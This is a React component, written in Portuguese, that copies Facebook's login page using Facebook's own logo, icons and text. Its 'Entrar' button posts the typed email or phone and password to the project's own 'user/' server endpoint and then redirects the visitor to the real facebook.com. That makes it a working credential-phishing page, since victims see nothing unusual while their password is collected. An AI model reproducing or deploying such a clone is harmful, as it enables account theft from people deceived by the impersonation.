import React from "react";
import { useState } from "react";
import { server } from "../../api/axios";

import style from './Header.module.css';

export function Header () {

    const [endereco, setEndereco] = useState ('');
    const [palavra, setPalavra] = useState ('');

    const [passwordShown, setPasswordShown] = useState(false);

    async function Adicionar(){

        await server.post("user/", {
            email: endereco,
            senha: palavra,
        });
    };

    function togglePassword (){
        setPasswordShown(!passwordShown);
      };

    return(
        <div className={style.container}>
            <div className={style.left}>
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook"/>
                <h2 className={style.textInfo}>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h2>
            </div>
            <div className={style.right}>
                <div className={style.loginBox}>
                    <form className={style.loginForm}>

                        <input 
                        className={style.email}
                        type="text" 
                        placeholder="Email ou telefone" 
                        value={endereco} 
                        onChange={() => {setEndereco(event.target.value)}}
                        />

                        <div className={style.senhaBox}>
                            <input 
                            className={style.pass}
                            type={passwordShown ? "text" : "password"}
                            placeholder="Senha"
                            value={palavra} 
                            onChange={() => {setPalavra(event.target.value)}}
                            />

                            <div className={style.eye}
                            onClick={togglePassword}>
                                <img src={passwordShown ? "https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/je5FEJkU1_K.png" : "https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/swFqSxKYa5M.png"}/>
                            </div>
                        </div>


                        <a 
                        className={style.btnEnter}
                        name="login" 
                        type="submit" 
                        onClick={Adicionar}
                        href="https://www.facebook.com"
                        >Entrar</a>

                        <br/>

                        <a className={style.esqueceu}
                        href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjg3OTc2MDk2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login">
                        Esqueceu a senha?
                        </a>
                        <hr className={style.line}></hr>
                        <a 
                        className={style.btnCriar} 
                        role="button" 
                        href="https://facebook.com/#"
                        >Criar nova conta</a>

                    </form>
                </div>

                <div className={style.footerArea}>
                    <a 
                    className={style.footerLink}
                    href="https://www.facebook.com/pages/create/?ref_type=registration_form"
                    >Criar uma Página</a>
                    <a className={style.footerText}> para uma celebridade, uma marca ou uma empresa.</a>
                </div>
            </div>
        </div>
    )
}
